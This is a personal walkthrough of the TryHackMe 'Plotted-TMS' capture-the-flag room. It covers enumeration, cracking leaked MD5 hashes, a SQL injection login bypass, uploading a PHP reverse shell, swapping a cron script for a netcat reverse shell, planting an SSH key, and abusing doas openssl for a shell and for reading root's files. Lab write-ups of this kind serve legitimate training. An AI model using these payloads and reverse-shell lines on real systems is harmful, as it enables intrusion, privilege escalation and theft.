---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Plotted-TMS
# DESCRIPTION       . Everything here is plotted!
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/plottedtms
```

```
sudo nmap -sSVC -T5 -p- 10.10.118.51 -oN plotted
```

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a36a9cb11260b272130984cc3873444f (RSA)
|   256 b93f8400f4d1fdc8e78d98033874a14d (ECDSA)
|_  256 d08651606946b2e139439097a6af9693 (ED25519)

80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)

445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- There was nothing except the default apache installation page on both port `80` and `445`.

- I've fuzzed both websites for endpoints.

#### PORT 80

```
ffuf -u http://10.10.118.51:80/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

```
admin                   [Status: 301, Size: 312, Words: 20, Lines: 10]
shadow                  [Status: 200, Size: 25, Words: 1, Lines: 2]
passwd                  [Status: 200, Size: 25, Words: 1, Lines: 2]
```

- The `/admin` endpoint contains the `id_rsa` file

```
VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE
```

- which is the base64 encoding of 

```
Trust me it is not this easy..now get back to enumeration :D
```

- In the `passwd` and `shadow` file there's the same base64 encoded text

```
bm90IHRoaXMgZWFzeSA6RA==
not this easy :D
```

#### PORT 445

```
ffuf -u http://10.10.118.51:445/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

```
management              [Status: 301, Size: 322, Words: 20, Lines: 10]
```

- I further enumerated `/management`

```
uploads                 [Status: 301, Size: 330, Words: 20, Lines: 10]
pages                   [Status: 301, Size: 328, Words: 20, Lines: 10]
admin                   [Status: 301, Size: 328, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 329, Words: 20, Lines: 10]
plugins                 [Status: 301, Size: 330, Words: 20, Lines: 10]
database                [Status: 301, Size: 331, Words: 20, Lines: 10]
classes                 [Status: 301, Size: 330, Words: 20, Lines: 10]
dist                    [Status: 301, Size: 327, Words: 20, Lines: 10]
inc                     [Status: 301, Size: 326, Words: 20, Lines: 10]
build                   [Status: 301, Size: 328, Words: 20, Lines: 10]
libs                    [Status: 301, Size: 327, Words: 20, Lines: 10]
```

- My first look was in `database` and I found `traffic_offense_db.sql` which contained the following

```
INSERT INTO `users` (`id`, `firstname`, `lastname`, `username`, `password`, ... VALUES
(1, 'Adminstrator', 'Admin', 'admin', '0192023a7bbd73250516f069df18b500', ...
(9, 'John', 'Smith', 'jsmith', '1254737c076cf867dc53d60a0364f38e', ...
```

```
0192023a7bbd73250516f069df18b500           admin123
1254737c076cf867dc53d60a0364f38e           jsmith123
```

- I tried both credential pairs against the login panel and ssh but I had no luck.

- Then, I've tried bruteforcing the login page but this proven unsuccesful as well.

- I had luck trying SQL Injection on the web page

```
1' or 1=1 -- true
```

- I noticed that the GUI gave me access to edit driver's picture, so I wondered if I could upload a reverse shell that way.

- For reference, the URL after going into edit mode for the first driver looked like this

```
http://10.10.118.51:445/management/admin/?page=drivers/manage_driver&id=1
```

- After I've  uploaded a PHP reverse shell, I could find it in the following directory

```
http://10.10.118.51:445/management/uploads/drivers/1.php
```

- Inside `/var/www/html/445/management/initialize.php` I found the credentials to the MySQL Database.

```
...
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"tms_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"{REDACTED}@123");
...
```

- However, there was nothing useful I could retrieve and the password didn't work for other existing system users.


#### PRIVILEGE ESCALATION --- www-data -> plot_admin

- Then, I've noticed that in `/etc/crontab` the `/var/www/scripts/backup.sh` script executes as `plot_admin`.
- We don't have access to modify it, but we own the directory. 

- So we can remove it entirely and create another `backup.sh` script containing a reverse shell.

```
cd /var/www/scripts
rm backup.sh
vim backup.sh

#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP 3132 >/tmp/f

chmod +x backup.sh
```

- After getting a connection back, we can grab first flag from `/home/plot_admin/user.txt`.

#### PRIVILEGE_ESCALATION --- plot_admin -> root

- `netstat` was missing from the system so I've used `ss -4tl` to list for listening TCP ports.

```
State     Recv-Q    Send-Q        Local Address:Port           Peer Address:Port    Process    
LISTEN    0         70                127.0.0.1:33060               0.0.0.0:*                  
LISTEN    0         151               127.0.0.1:mysql               0.0.0.0:*                  
LISTEN    0         4096          127.0.0.53%lo:domain              0.0.0.0:*                  
LISTEN    0         128                 0.0.0.0:ssh                 0.0.0.0:*                 
```

- Port `33060` is internal and I want to see what is there. 
- I wanted to port-forward the service using SSH, but I had no keys.

- I created the `.ssh` directory in `/home/plot_admin`.

- Then, I've created `authorized_keys` file in `/home/plot_admin/.ssh`.

- On my attack box, I've generated a ssh keypair using `ssh-keygen`

- The `authorized_keys` contained the public key.

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqTv4vfXRai5rs0qfEoG0UwzpzVQH7EHcKb9cDSZ5d3xwf7VZEdmJdR2R8rVtDVQI6uwtDOmGDjwiyO9JE5mDH/4Us0ApNB6eRKzNaBU3UNuP0puE7Mm0tBAASdUA8W42NzibMFysThNyRcmNIqQHjfjIGyScFrqkgoDkI2dl5V54Y6UIG0J07vfIggzQ58nvf4/UZZEeITaQ8E+gyYkjUVjnvtMj7NVxfNgdyqi/ZHQfAvD8XbcGeNFA+eMe4TilUg1kLsYwxAMmILw4e+3/o0juErWnIh1akK69zXFAL+qjMWiw0OwCgXSJH/gKeZl9a1PPCUpbujfJXeYlq1RNEiN0fXvyvRWT4UXYNVMNUwwasPVPSHzjGoeAbtPS1LZJeR5gDqvT9hg+dnVjQE78c2019yWfvAe6vJrt790SUxd21VPciGJ6EbPqWxaejqgBTjh0SL2jgrunrb+8mDaqd0aiV1t4HkJIEO6l+Q/EMyzaLmA0rRKOsUh8IylJjeSs=
```

- Then, I've used `ssh` to port-forward the port `33060` to my box.

```bash
# a = private ssh key (creative name, I know)
ssh -L 5555:127.0.0.1:33060 -i a plot_admin@10.10.118.51
```

- And I've scanned the port using `nmap`.

```
sudo nmap -sSVC -p 5555 127.0.0.1
```

- But... from the output I noticed that this wasn't helpful at all. In fact, I was confused and I've googled about port `33060`. And ... it seems that it is used by mysql. More info [here](https://stackoverflow.com/questions/63556825/what-is-the-port-33060-for-mysql-server-ports-in-addition-to-the-port-3306)

- Should've checked google first :) Back to enumeration.

- Anyway. I couldn't find anything manually and I had to use something like linpeas thinking that maybe I've missed something. 

```
[+] Checking /etc/doas.conf
permit nopass plot_admin as root cmd openssl
```

- Alright. No idea how I should've catched this manually and I don't really like using automated tools, but whatever --- still no excuse for missing this out.

- So we can use `doas` without a password to run `openssl`.

- I tried getting a reverse shell just to see if it's possible with `doas` too. 

**ATTACK BOX

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
```

**TARGET

```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | doas openssl s_client -quiet -connect IP:PORT > /tmp/s; rm /tmp/s
```

- And it worked, but the shell was still under `plot_admin` and not under `root`. I assumed this is because this method is supposed to work with `sudo` and maybe `doas` does something different.

- Anyway, `doas openssl` could still be used to read from files we don't have access to.

```
doas openssl enc -in /root/root.txt
```

